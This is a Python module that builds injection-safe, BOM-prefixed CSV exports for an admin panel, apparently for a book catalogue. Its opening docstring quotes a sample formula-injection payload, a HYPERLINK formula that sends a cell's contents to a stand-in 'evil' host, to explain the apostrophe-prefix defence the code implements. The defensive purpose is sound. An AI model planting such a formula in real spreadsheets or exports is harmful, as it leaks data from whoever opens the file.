"""
CSV downloads for the admin.

Two things every export here has to get right, and the first one is a security
control rather than a nicety.

FORMULA INJECTION

A spreadsheet treats a cell beginning with =, +, - or @ as a formula. These
exports carry text people typed into public forms — a contact message, a
manuscript synopsis, a name — so a cell reading

    =HYPERLINK("http://evil/?"&A1,"Click me")

is not hypothetical, it is a well-known way to attack whoever opens the file.
Excel and Sheets both warn, and warnings get clicked through. Any cell starting
with one of those characters is prefixed with an apostrophe, which spreadsheets
strip on display but never execute.

ENCODING

Excel on Windows reads a UTF-8 CSV as Latin-1 unless the file opens with a byte
order mark. Without it every ₹ becomes â‚¹ and every Devanagari or accented name
turns to mojibake — which, for a catalogue of Indian authors, is most of the
interesting rows. The BOM costs three bytes.
"""

from __future__ import annotations

import csv
import io
from datetime import datetime, timezone
from typing import Any, Iterable, List, Sequence

from fastapi.responses import StreamingResponse

# Anything a spreadsheet might evaluate. Tab and carriage return are included
# because both can start a formula once a cell is re-parsed.
_RISKY_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def safe_cell(value: Any) -> str:
    """One cell, rendered so no spreadsheet will execute it."""
    if value is None:
        return ""
    if isinstance(value, bool):
        return "yes" if value else "no"
    s = str(value)
    if s.startswith(_RISKY_PREFIXES):
        return "'" + s
    return s


def csv_response(filename: str, headers: Sequence[str], rows: Iterable[Sequence[Any]]) -> StreamingResponse:
    """A downloadable CSV, BOM-prefixed and injection-safe.

    Streams a single string rather than a generator: these exports are thousands
    of rows at most, and holding one in memory is simpler than keeping a cursor
    open across the response.
    """
    buf = io.StringIO()
    writer = csv.writer(buf, quoting=csv.QUOTE_MINIMAL, lineterminator="\r\n")
    writer.writerow([safe_cell(h) for h in headers])
    for row in rows:
        writer.writerow([safe_cell(c) for c in row])

    stamp = datetime.now(timezone.utc).strftime("%Y-%m-%d")
    name = f"{filename}-{stamp}.csv"
    # ﻿ is the BOM; it must be the very first character of the payload.
    return StreamingResponse(
        iter(["﻿" + buf.getvalue()]),
        media_type="text/csv; charset=utf-8",
        headers={"Content-Disposition": f'attachment; filename="{name}"'},
    )


def flatten_items(items: List[dict]) -> str:
    """Order lines as one cell: '2× Applied Psychology (9788194031239)'.

    A row per line item would be more normalised and much less useful — the
    person opening this wants one row per order, with enough to see what was in
    it.
    """
    parts = []
    for it in items or []:
        qty = int(it.get("quantity") or 1)
        title = it.get("title") or "?"
        isbn = it.get("isbn")
        parts.append(f"{qty}× {title}" + (f" ({isbn})" if isbn else ""))
    return " | ".join(parts)
